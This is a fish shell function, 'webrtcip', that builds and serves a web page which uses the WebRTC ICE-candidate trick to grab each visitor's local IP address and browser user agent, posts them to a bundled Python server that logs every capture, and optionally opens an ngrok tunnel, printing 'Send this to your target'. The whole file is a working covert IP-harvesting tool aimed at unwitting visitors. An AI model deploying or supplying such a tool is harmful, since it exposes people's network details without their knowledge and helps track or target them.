function webrtcip
    argparse -n webrtcip 'p/port=' 'h/help' -- $argv
    or return

    if set -q _flag_help
        echo "Usage: webrtcip [-p <port>]"
        echo ""
        echo "Starts a local HTTP server with WebRTC IP capture."
        echo "Anyone who visits the page will have their local IP logged."
        echo ""
        echo "Options:"
        echo "  -p <port>   Port to listen on (default: 8080)"
        echo ""
        echo "Examples:"
        echo "  webrtcip"
        echo "  webrtcip -p 9999"
        return
    end

    set port 8080
    if set -q _flag_port
        set port $_flag_port
    end

    set tmpdir (mktemp -d /tmp/webrtcip.XXXXXX)

    cat > $tmpdir/index.html << 'EOF'
<!DOCTYPE html>
<html><body><script>
(async () => {
  let ip = 'unknown';
  try {
    ip = await new Promise((resolve) => {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel('');
      pc.createOffer().then((o) => pc.setLocalDescription(o));
      let done = false;
      pc.onicecandidate = (e) => {
        if (!e.candidate || done) return;
        resolve(e.candidate.candidate.split(' ')[4]);
        done = true;
      };
      setTimeout(() => { if (!done) { done = true; resolve('timeout'); } }, 3000);
    });
  } catch(e) { ip = 'error'; }
  try {
    await fetch('/report', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip, ua: navigator.userAgent })
    });
  } catch(e) {}
  document.body.innerHTML = '<h2>IP: ' + ip + '</h2>';
})();
</script></body></html>
EOF

    cat > $tmpdir/server.py << 'PYEOF'
import http.server, json, sys, os, socket, signal

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
DIR = os.path.dirname(os.path.abspath(__file__))
HTML = open(os.path.join(DIR, 'index.html')).read()

# get LAN IP via UDP connect trick
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
    s.connect(('8.8.8.8', 80))
    LAN_IP = s.getsockname()[0]
except:
    LAN_IP = '127.0.0.1'
s.close()

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(HTML.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/report':
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            try:
                data = json.loads(body)
                ip = data.get('ip', '?')
                ua = data.get('ua', '?')
                log = f"[+] IP: {ip}  UA: {ua[:80]}"
                print(log, flush=True)
                with open(os.path.join(DIR, 'captures.log'), 'a') as f:
                    f.write(log + '\n')
            except:
                pass
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'ok')
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, *a): pass

print()
print(f"  Server:       http://0.0.0.0:{PORT}")
print(f"  LAN:          http://{LAN_IP}:{PORT}")
print(f"  Local:        http://localhost:{PORT}")
print()
print("  Waiting for visitors...")
print("  " + "-" * 40)

httpd = http.server.HTTPServer(('0.0.0.0', PORT), Handler)
httpd.serve_forever()
PYEOF

    echo ""
    echo (set_color cyan)"==> WEBRTC IP CAPTURE"(set_color normal)
    echo (set_color brblack)"    Serving from $tmpdir"(set_color normal)
    echo ""

    if command -v ngrok &>/dev/null
        echo (set_color green)"    ngrok found, starting tunnel..."(set_color normal)
        ngrok http $port --log=stdout 2>&1 &
        sleep 2
        set ngrok_url (curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print([t['public_url'] for t in d['tunnels'] if t['proto']=='https'][0])" 2>/dev/null)
        if test -n "$ngrok_url"
            echo (set_color green)"    Public URL: $ngrok_url"(set_color normal)
            echo (set_color brblack)"    Send this to your target"(set_color normal)
        else
            echo (set_color yellow)"    ngrok tunnel failed, check ngrok status"(set_color normal)
        end
    else
        echo (set_color yellow)"    ngrok not found — install for public URL:"(set_color normal)
        echo (set_color cyan)"    https://ngrok.com/download"(set_color normal)
    end
    echo ""

    function __cleanup_webrtcip --on-job-exit caller
        rm -rf $tmpdir
        functions -e __cleanup_webrtcip
    end

    python3 $tmpdir/server.py $port
    rm -rf $tmpdir
end
